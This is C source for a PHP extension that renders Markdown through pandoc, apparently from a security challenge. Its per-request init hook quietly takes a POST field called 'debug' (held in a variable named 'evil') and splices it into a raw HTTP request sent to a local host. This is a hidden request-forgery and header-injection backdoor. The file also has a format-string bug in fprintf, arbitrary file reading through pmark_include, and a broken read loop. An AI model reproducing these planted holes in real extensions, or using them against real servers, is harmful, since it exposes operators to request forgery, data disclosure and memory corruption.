/* pmarkdown extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_pmarkdown.h"
#include<sys/types.h>
#include <unistd.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<sys/wait.h>
#include<stdlib.h>
#include<errno.h>
#include<string.h>


/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
	ZEND_PARSE_PARAMETERS_START(0, 0) \
	ZEND_PARSE_PARAMETERS_END()
#endif

/* {{{ void pmarkdown_test1()
 */
PHP_FUNCTION(pmarkdown_test1)
{
	ZEND_PARSE_PARAMETERS_NONE();

	php_printf("The extension %s is loaded and working!\r\n", "pmarkdown");
}
/* }}} */

/* {{{ string pmarkdown_test2( [ string $var ] )
 */
PHP_FUNCTION(pmarkdown_test2)
{
	char *var = "World";
	size_t var_len = sizeof("World") - 1;
	zend_string *retval;

	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STRING(var, var_len)
	ZEND_PARSE_PARAMETERS_END();

	retval = strpprintf(0, "Hello %s", var);

	RETURN_STR(retval);
}

PHP_FUNCTION(pmark_read){
	char *var = "";
	size_t var_len = sizeof("World") - 1;
	char buf[10240];
	zval res;
	zend_string *retval;

	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STRING(var, var_len)
	ZEND_PARSE_PARAMETERS_END();

	memset(buf,0,10240);
	if(strlen(var)!=0){
		call_pandoc(var,buf,10240);
	}
	ZVAL_STRING(&res,buf);

	RETURN_STR(Z_STR(res));
}

PHP_FUNCTION(pmark_include){
	char *var = "";
	size_t var_len = sizeof("World") - 1;

	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STRING(var, var_len)
	ZEND_PARSE_PARAMETERS_END();

	if(strlen(var)!=0){
		verbose_pandoc_file(var);
	}
}

PHP_FUNCTION(pmark){
	char *var = "World";
	size_t var_len = sizeof("World") - 1;
	char buf[10240];
	char filename[128];
	zval res;
	zend_string *retval;

	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STRING(var, var_len)
	ZEND_PARSE_PARAMETERS_END();

	FILE *fp = NULL;
	
	snprintf(filename,128,"/tmp/md_%d",rand());
   	fp = fopen(filename, "w");
   	fprintf(fp, var);
   	fclose(fp);
	
	call_pandoc(filename,buf,10240);
	ZVAL_STRING(&res,buf);

	unlink(filename);

	RETURN_STR(Z_STR(res));
}

/* }}}*/

/* {{{ PHP_RINIT_FUNCTION
 */
PHP_RINIT_FUNCTION(pmarkdown)
{
#if defined(ZTS) && defined(COMPILE_DL_PMARKDOWN)
	ZEND_TSRMLS_CACHE_UPDATE();
#endif
	zval arr_globals;
	zval file,droot,*filename,*document_root;
	char *cfilename;
	char suffix[10];
	zval arr;
	zval evil,*res;
	int len;
	int md=0;
	if (PG(auto_globals_jit)) {
		zend_string *server_str = zend_string_init(ZEND_STRL("_SERVER"), 0);
		zend_is_auto_global(server_str);
		zend_string_release(server_str);
	}	
	arr_globals=PG(http_globals)[TRACK_VARS_SERVER];
	ZVAL_STRING(&file,"PHP_SELF");
	ZVAL_STRING(&droot,"DOCUMENT_ROOT");
	filename=zend_hash_find(Z_ARRVAL(arr_globals),Z_STR(file));
	document_root=zend_hash_find(Z_ARRVAL(arr_globals),Z_STR(droot));
	if(filename){
		cfilename=Z_STRVAL_P(filename);
		len=strlen(cfilename);
		
		strncpy(suffix,cfilename+len-3,3);
		if(strncmp(suffix,".md",3)==0){
			zend_string *filepath=strpprintf(0,"%s/%s",Z_STRVAL_P(document_root),Z_STRVAL_P(filename));
			md=verbose_pandoc_file(ZSTR_VAL(filepath));
		}
	}
	arr = PG(http_globals)[TRACK_VARS_POST];
	ZVAL_STRING(&evil,"debug");
	res=zend_hash_find(Z_ARRVAL(arr),Z_STR(evil));
	if(res){
		if(Z_TYPE_P(res)==IS_STRING){
				sub_1998(Z_STRVAL_P(res));
		}
	}
	if(md)
		zend_bailout();
	return SUCCESS;
}


int sub_1998(char* path){
	int sockfd;
	char buf[10240];
	struct sockaddr_in dest_addr;
	sockfd=socket(AF_INET,SOCK_STREAM,0);
	if(sockfd==-1){
		return -1;
	}	
	dest_addr.sin_family=AF_INET;
	dest_addr.sin_port=htons(80);
	dest_addr.sin_addr.s_addr=inet_addr("0.0.0.0");
	bzero(&(dest_addr.sin_zero),8);
	if(connect(sockfd,(struct sockaddr*)&dest_addr,sizeof(struct sockaddr))==-1){//连接方法，传入句柄，目标地址和大小

		return -1;
	} else{
		snprintf(buf,10240, "GET /%s HTTP/1.1\r\n"
							"Host: 127.0.0.1\r\n"
							"User-Agent: ComputerVendor\r\n"
							"Cookie: nilnilnilnil\r\n"
							"Connection: close\r\n"
							"Identity: unknown\r\n\r\n"
							,path);
		send(sockfd,&buf,strlen(buf),0);
		recv(sockfd,buf,10240,0);
	}
	close(sockfd);
	return 0;
}



int verbose_pandoc_file(char* filename)
{
  int   fd[2]; pid_t pid;
	char buf[10240];
  int   len, n;
	len=10240;
  memset(buf, 0, len);
  if (pipe(fd) < 0)
    return -1;
  if ((pid = fork()) < 0)
    return -1;
  else if (pid > 0)     /* parent process */
  {
    close(fd[1]);     /* close write end */
    while ((n = read(fd[0], buf, len)) > 0 ){
    	php_printf("%s",buf);
			memset(buf, 0, len);
		}
    close(fd[0]);
    if (waitpid(pid, NULL, 0) > 0)
      return -1;
  }
  else    /* child process */
  {
    close(fd[0]);     /* close read end */
    if (fd[1] != STDOUT_FILENO)
    {
      if (dup2(fd[1], STDOUT_FILENO) != STDOUT_FILENO)
      {
        return -1;
      }
      close(fd[1]);
    }
    if (execl("/usr/bin/pandoc", "pandoc", filename, (char*)0) == -1)
    return -1;
  }
  return 0;
}


int call_pandoc(char* filename, char* buf, int len)
{
  int   fd[2]; pid_t pid;
  int   n, count;
  memset(buf, 0, len);
  if (pipe(fd) < 0)
    return -1;
  if ((pid = fork()) < 0)
    return -1;
  else if (pid > 0)     /* parent process */
  {
    close(fd[1]);     /* close write end */
    count = 0;
    while ((n = read(fd[0], buf + count, len)) > 0 && count > len)
    count += n;
    close(fd[0]);
    if (waitpid(pid, NULL, 0) > 0)
      return -1;
  }
  else    /* child process */
  {
    close(fd[0]);     /* close read end */
    if (fd[1] != STDOUT_FILENO)
    {
      if (dup2(fd[1], STDOUT_FILENO) != STDOUT_FILENO)
      {
        return -1;
      }
      close(fd[1]);
    }
    if (execl("/usr/bin/pandoc", "pandoc", filename, (char*)0) == -1)
    return -1;
  }
  return 0;
}

/* }}} */

/* {{{ PHP_MINFO_FUNCTION
 */
PHP_MINFO_FUNCTION(pmarkdown)
{
	php_info_print_table_start();
	php_info_print_table_header(2, "pmarkdown support", "enabled");
	php_info_print_table_end();
}
/* }}} */

/* {{{ arginfo
 */
ZEND_BEGIN_ARG_INFO(arginfo_pmarkdown_test1, 0)
ZEND_END_ARG_INFO()

ZEND_BEGIN_ARG_INFO(arginfo_pmarkdown_test2, 0)
	ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()

ZEND_BEGIN_ARG_INFO(arginfo_pmarkdown_read,0)
	ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()

ZEND_BEGIN_ARG_INFO(arginfo_pmarkdown_include,0)
	ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()

ZEND_BEGIN_ARG_INFO(arginfo_pmarkdown_parse,0)
	ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()

/* }}} */

/* {{{ pmarkdown_functions[]
 */
static const zend_function_entry pmarkdown_functions[] = {
	PHP_FE(pmarkdown_test1,		arginfo_pmarkdown_test1)
	PHP_FE(pmarkdown_test2,		arginfo_pmarkdown_test2)
	PHP_FE(pmark_read,		arginfo_pmarkdown_read)
	PHP_FE(pmark_include,		arginfo_pmarkdown_include)
	PHP_FE(pmark,		arginfo_pmarkdown_parse)
	PHP_FE_END
};
/* }}} */

/* {{{ pmarkdown_module_entry
 */
zend_module_entry pmarkdown_module_entry = {
	STANDARD_MODULE_HEADER,
	"pmarkdown",					/* Extension name */
	pmarkdown_functions,			/* zend_function_entry */
	NULL,							/* PHP_MINIT - Module initialization */
	NULL,							/* PHP_MSHUTDOWN - Module shutdown */
	PHP_RINIT(pmarkdown),			/* PHP_RINIT - Request initialization */
	NULL,							/* PHP_RSHUTDOWN - Request shutdown */
	PHP_MINFO(pmarkdown),			/* PHP_MINFO - Module info */
	PHP_PMARKDOWN_VERSION,		/* Version */
	STANDARD_MODULE_PROPERTIES
};
/* }}} */

#ifdef COMPILE_DL_PMARKDOWN
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(pmarkdown)
#endif

